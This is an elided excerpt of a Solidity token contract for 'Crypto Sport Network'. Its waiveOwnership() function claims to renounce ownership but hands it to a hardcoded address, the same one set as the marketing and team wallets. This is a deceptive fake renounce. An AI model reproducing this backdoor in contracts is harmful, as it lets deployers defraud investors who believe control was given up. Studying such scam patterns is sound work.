...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xbA34f7E44cCeeDd3Bd98481526B86Df659b4456A);
    }
...
contract CryptoSportsNetwork is Context, IERC20, Ownable {
    ...
    string private _name = "Crypto Sport Network";
    string private _symbol = "CSPN";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xbA34f7E44cCeeDd3Bd98481526B86Df659b4456A);
    address payable public teamWalletAddress = payable(0xbA34f7E44cCeeDd3Bd98481526B86Df659b4456A);
